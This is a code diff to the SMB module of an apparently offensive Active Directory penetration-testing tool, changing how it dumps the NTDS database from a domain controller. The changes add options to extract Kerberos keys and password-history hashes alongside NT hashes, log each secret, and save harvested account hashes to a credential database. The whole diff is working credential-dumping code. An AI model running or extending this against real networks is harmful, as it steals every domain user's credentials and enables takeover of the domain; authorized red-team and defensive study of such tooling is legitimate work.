@@ -2289,29 +2289,43 @@ class smb(connection):
         use_vss_method = False
         NTDSFileName = None
         host_id = self.db.get_hosts(filter_term=self.host)[0][0]
+        printed_kerb_keys_banner = False
 
-        def add_ntds_hash(ntds_hash, host_id):
-            add_ntds_hash.ntds_hashes += 1
-            if self.args.enabled:
-                if "Enabled" in ntds_hash:
-                    ntds_hash = " ".join(ntds_hash.split(" ")[:-1])
-                    self.logger.highlight(ntds_hash)
+        def add_hash(secret_type, secret, host_id):
+            nonlocal printed_kerb_keys_banner
+            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                self.logger.display("Kerberos keys:")
+                printed_kerb_keys_banner = True
+
+            # Count the type of secrets
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                add_hash.kerb_secrets += 1
             else:
-                ntds_hash = " ".join(ntds_hash.split(" ")[:-1])
-                self.logger.highlight(ntds_hash)
-            if ntds_hash.find("$") == -1:
-                if ntds_hash.find("\\") != -1:
-                    domain, clean_hash = ntds_hash.split("\\")
+                add_hash.nt_lm_secrets += 1
+
+            # Log the secret based on args
+            if self.args.enabled:
+                if "Enabled" in secret:
+                    secret = " ".join(secret.split(" ")[:-1])
+                    self.logger.highlight(secret)
+            else:
+                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+                self.logger.highlight(secret)
+
+            # Filter out computer accounts, history hashes and kerberos keys for adding to db
+            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                if secret.find("\\") != -1:
+                    domain, clean_hash = secret.split("\\")
                 else:
                     domain = self.domain
-                    clean_hash = ntds_hash
+                    clean_hash = secret
 
                 try:
                     username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                     parsed_hash = f"{lmhash}:{nthash}"
                     if validate_ntlm(parsed_hash):
                         self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
-                        add_ntds_hash.added_to_db += 1
+                        add_hash.added_to_db += 1
                         return
                     raise
                 except Exception:
@@ -2319,20 +2333,16 @@ class smb(connection):
             else:
                 self.logger.debug("Dumped hash is a computer account, not adding to db")
 
-        add_ntds_hash.ntds_hashes = 0
-        add_ntds_hash.added_to_db = 0
+        add_hash.nt_lm_secrets = 0
+        add_hash.kerb_secrets = 0
+        add_hash.added_to_db = 0
 
         if self.remote_ops:
             try:
                 if self.args.ntds == "vss":
                     NTDSFileName = self.remote_ops.saveNTDS()
                     use_vss_method = True
-
             except Exception as e:
-                # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
-                # We don't store the resume file if this error happened, since this error is related to lack
-                # of enough privileges to access DRSUAPI.
-                #    if resumeFile is not None:
                 self.logger.fail(e)
 
         self.output_filename = self.output_file_template.format(output_folder="ntds")
@@ -2341,26 +2351,27 @@ class smb(connection):
             NTDSFileName,
             self.bootkey,
             isRemote=True,
-            history=False,
+            history=self.args.history,
             noLMHash=True,
             remoteOps=self.remote_ops,
             useVSSMethod=use_vss_method,
-            justNTLM=True,
+            justNTLM=not self.args.kerberos_keys,
             pwdLastSet=False,
             resumeSession=None,
             outputFileName=self.output_filename,
             justUser=self.args.userntds if self.args.userntds else None,
             printUserStatus=True,
-            perSecretCallback=lambda secret_type, secret: add_ntds_hash(secret, host_id),
+            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
         )
 
         try:
             self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
             NTDS.dump()
             ntds_outfile = f"{self.output_filename}.ntds"
-            self.logger.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {ntds_outfile} of which {highlight(add_ntds_hash.added_to_db)} were added to the database")
+            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+            if self.args.kerberos_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
             self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-            self.logger.display(f"cat {ntds_outfile} | grep -iv disabled | cut -d ':' -f1")
             self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
         except Exception as e:
             # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
